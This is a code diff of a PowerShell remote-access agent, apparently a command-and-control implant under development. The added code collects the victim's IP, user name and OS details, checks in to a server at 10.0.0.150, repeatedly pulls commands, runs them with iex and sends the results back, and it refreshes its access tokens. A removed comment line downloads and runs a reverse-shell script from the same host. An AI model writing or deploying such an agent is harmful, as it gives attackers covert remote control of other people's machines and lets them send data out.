@@ -36,14 +36,18 @@ add-type @"
 
 $complete = @("")
 $pending = @("")
+$ip_result = Invoke-WebRequest ipinfo.io/ip | Select-Object -ExpandProperty Content
+$user_result = iex whoami
+$os_result = (Get-WMIObject win32_operatingsystem).name + " " + (Get-WmiObject Win32_OperatingSystem).OSArchitecture + " "  +  (Get-WmiObject Win32_OperatingSystem).CSName
+$agent_id_result = Get-Random -Minimum -1000 -Maximum 90000
+
 $json_format = @{
-    agent_id='joe'
-    ip='doe'
-    os='windows'
-    user='guest'
+    agent_id= $agent_id_result
+    ip= $ip_result.trim()
+    os= $os_result.trim()
+    user= $user_result.trim()
     pending_commands=@()
     completed_commands=@()
-
 
 }
 
@@ -57,7 +61,6 @@ $response = Invoke-RestMethod "https://10.0.0.150:9000/first_check_in" -Method P
 $doc_id = $response.id
 $refresh_token = $response.refresh
 $access_token = $response.token
-<## end first_check_in function #>
 
 
 $poll_headers = @{}
@@ -67,56 +70,48 @@ $poll_headers.Add('Authorization',"Bearer $access_token")
 $complete_commands =@{}
 
 while ($true){
-$polling_resp = Invoke-RestMethod "https://10.0.0.150:9000/poll" -Method Get -Headers $poll_headers -ContentType 'application/json'
-echo $polling_resp | ConvertTo-Json
 
+$polling_resp = Invoke-RestMethod "https://10.0.0.150:9000/poll" -Method Get -Headers $poll_headers -ContentType 'application/json'
 $post_body = ConvertTo-HashtableFromPsCustomObject($polling_resp)
-$post_body
+
 
   if ($polling_resp.pending_commands) {
-    echo "found something"
     foreach ($command in $polling_resp.pending_commands){
 
     if ($command.StartsWith('"')){
-    echo "starts with doubleqoute"
     $comm_result = iex "& $command" | format-list
     $complete_commands.Add($command,$comm_result) 
-    #$json_format.completed_commands += $complete_commands
-    #$post_body.completed_commands += @($command)
-    #$post_body.completed_commands += @($comm_result)
     $post_body.completed_commands += @{$command=$comm_result}
     }
     else{
     $comm_result = iex $command
     $complete_commands.Add($command,$comm_result)
-    #$json_format.completed_commands += $complete_commands
     $post_body.completed_commands += @{$command=$comm_result}
-    #$post_body.completed_commands += @($comm_result)
     }
   }
     $post_body.pending_commands = @()
     $json_post = $post_body | ConvertTo-Json
     $post_resp = Invoke-RestMethod "https://10.0.0.150:9000/poll" -Method Post -Body $json_post -Headers $poll_headers -ContentType 'application/json'
-    echo "POST SUCCESS"
+    # call refresh to get new token and add it to the headers hash table
+    $refresh_resp = Invoke-RestMethod "https://10.0.0.150:9000/refresh" -Method Get -Headers @{"Authorization"="Bearer $refresh_token"} -ContentType 'application/json'
+    $access_token = $refresh_resp.token
+    $poll_headers['Authorization'] = "Bearer $access_token"
 
 }
   else {
-    echo "no command"
-    # call refresh to get new token
+    #echo "no command"
+    # call refresh to get new token and add it to the headers hash table
+    $refresh_resp = Invoke-RestMethod "https://10.0.0.150:9000/refresh" -Method Get -Headers @{"Authorization"="Bearer $refresh_token"} -ContentType 'application/json'
+    $access_token = $refresh_resp.token
+    $poll_headers['Authorization'] = "Bearer $access_token"
   }
 
   sleep(10)
 
   }
 
-  #IEX(New-Object Net.WebClient).DownloadString('http://10.0.0.150/Invoke-PowerShellTcp.ps1')
   #echo "while loop ended"
-  #echo $json_format.completed_commands
-  echo $post_body | ConvertTo-Json
-  #echo $poll_headers
-  #echo $polling_resp | ConvertTo-Json
-  
-  ## so far command execution works
-  ## just need to post results and keep running loop
+  #echo $post_body | ConvertTo-Json
+ 
 
 
